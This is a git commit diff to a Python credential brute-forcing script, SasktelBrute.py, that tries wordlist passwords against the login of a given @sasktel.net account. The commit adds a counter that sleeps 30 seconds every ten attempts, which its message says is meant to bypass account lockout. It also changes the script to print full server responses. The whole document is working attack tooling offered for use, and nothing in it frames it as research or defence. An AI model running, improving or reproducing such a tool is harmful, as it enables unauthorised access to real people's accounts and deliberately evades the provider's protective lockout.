f9a235b3e48067c53bdc4ad5e802103c705bca82
Derek Johnston <101991363+usethisname1419@users.noreply.github.com>
2023-09-27 16:54:17 -0600

    Update SasktelBrute.py
    Waits 30 seconds every 10 attempts to bypass lockout

--- SasktelBrute.py
+++ SasktelBrute.py
@@ -1,6 +1,6 @@
 import requests
 import argparse
-import time  
+import time
 
 def parse_arguments():
     parser = argparse.ArgumentParser(
@@ -12,7 +12,7 @@ def parse_arguments():
     parser.add_argument('-u', '--user', type=str, required=True, help="Full username including @sasktel.net")
     args = parser.parse_args()
 
-    with open(args.wordlist) as file:
+    with open(args.wordlist, encoding='latin-1') as file:
         passwords = file.read().splitlines()
 
     user = args.user
@@ -33,7 +33,7 @@ def attack(user, password):
         'ADRUM': 'isAjax:true',
         'Sec-Fetch-Dest': 'empty',
         'Sec-Fetch-Mode': 'cors',
-        'Sec-Fetch-Site': 'same-origin' 
+        'Sec-Fetch-Site': 'same-origin'
     }
 
     data = {
@@ -51,20 +51,22 @@ def attack(user, password):
 
     try:
         response = requests.post(url, json=data, headers=headers, timeout=10)
-        print(f"CODE: {response.status_code}")   
+        print(f"RESPONSE: {response.text}")
         if response.status_code == 200:
             print(f"PASSWORD FOUND: {password}")
             return True
     except requests.RequestException as e:
         print(f"Error during request: {e}")
-        return False  
+        return False
 
-    return False  
+    return False
 
 if __name__ == '__main__':
     user, passwords = parse_arguments()
 
     print("Starting the attack...")
+
+    attempt_count = 0  # Initialize the counter
 
     for password in passwords:
         print(f"Trying password: {password}")
@@ -72,6 +74,13 @@ if __name__ == '__main__':
         if attack(user, password):
             break
 
-        time.sleep(2)  
+        time.sleep(2)
+        attempt_count += 1  # Increment the counter
+
+        # If 10 attempts have been made, wait for 30 seconds and reset the counter
+        if attempt_count == 10:
+            print("Waiting for 30 seconds...")
+            time.sleep(30)
+            attempt_count = 0
 
     print("Attack finished.")
